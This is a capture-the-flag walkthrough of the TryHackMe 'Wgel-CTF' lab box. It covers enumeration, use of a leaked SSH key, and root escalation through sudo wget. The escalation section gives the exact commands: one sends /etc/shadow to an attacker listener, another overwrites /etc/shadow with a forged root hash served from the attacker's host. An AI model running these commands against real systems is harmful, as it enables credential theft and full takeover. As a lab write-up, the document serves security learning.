# Wgel-CTF

**IP:** 10.10.108.60  
**Platform:** THM  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 07/06/2025

## Reconnaissance

```bash
nmap -sC -sV -T4 10.10.108.60 -oA nmap/Wgel-CTF
```

| Port | Service | Version                         |
| ---- | ------- | ------------------------------- |
| 22   | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80   | http    | Apache httpd 2.4.18             |

## Enumeration

Site root `/` source reveals a username `jessie` in a comment.
```html
<!-- Jessie don't forget to udate the webiste -->
```

Found a `.ssh` directory in `/sitemap` on the webserver.
```bash
ffuf -u http://10.10.108.60:80/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -c -s -fc 403 -e .php,.txt 

sitemap
                                                             
ffuf -u http://10.10.108.60:80/sitemap/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -c -s -fc 403 -e .php,.txt

images
js
css
.
fonts
.ssh
```

## Exploitation

Downloaded `jessie`'s `id_rsa` private key and SSH'd in.
```bash
wget -q http://10.10.108.60/sitemap/.ssh/id_rsa;ls
id_rsa
                                                                         
chmod 600 id_rsa   

ssh jessie@10.10.108.60 -i id_rsa  
```

User flag was in `/home/jessie/Documents/user_flag.txt`
```bash
cat /home/jessie/Documents/user_flag.txt 
```
## Privilege Escalation

`jessie` could run `/usr/bin/wget` as `root` with NOPASSWD.
```bash
sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

So I opnened a `netcat` listener on my machine
```bash
rlwrap nc -nvlp 4444
listening on [any] 4444 ...
```

And was able to send over `/etc/shadow` to the listener with the `sudo` permissions.
```bash
sudo /usr/bin/wget --post-file=/etc/shadow 10.23.121.106:4444

--2025-06-07 19:33:55--  http://10.23.121.106:4444/
Connecting to 10.23.121.106:4444... connected.
...
```

I then generated a new password for the root user, saved it to a `shadow.txt` file and served it back to the target machine.
```bash
...
root:!:18195:0:99999:7:::
...
                                                                          
openssl passwd -6 -salt 'wither' 'wither'
$6$wither$/qpRfUDUvxPw.lF8NwoqIXa/bUT/Pc6zIImHSDELtQHebax0/GWhGx8ixElaMHlDbWUXbIMlnIMAwEtHN1SCt0
                                                                                nvim shadow.txt 
                                                                                head shadow.txt 
                                                                                
root:$6$wither$/qpRfUDUvxPw.lF8NwoqIXa/bUT/Pc6zIImHSDELtQHebax0/GWhGx8ixElaMHlDbWUXbIMlnIMAwEtHN1SCt0:18195:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
                                                                                python3 -m http.server 80
```

I again used the `sudo` permissions on `wget` to overwrite `/etc/shadow` with my malicious `shadow.txt`, and login as the `root` user with my new password.
```bash
sudo /usr/bin/wget http://10.23.121.106:80/shadow.txt -O /etc/shadow 

--2025-06-07 19:37:39--  http://10.23.121.106/shadow.txt
Connecting to 10.23.121.106:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1368 (1,3K) [text/plain]
Saving to: ‘/etc/shadow’

/etc/shadow             100%[============================>]   1,34K  --.-KB/s    in 0s      

2025-06-07 19:37:39 (150 MB/s) - ‘/etc/shadow’ saved [1368/1368]

jessie@CorpOne:~$ su -
Password: 
root@CorpOne:~# 
```

`root` flag was in `/root/root_flag.txt`,
```bash
cat /root/root_flag.txt
```

## References
- [Sudo Wget Privilege Escalation \| Linux Privilege Escalation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wget-privilege-escalation)

---
#nmap #ffuf #ssh-key-exposure #sudo-wget #shadow-overwrite #gtfobins #file-exfil #password-gen #linux-privesc #thm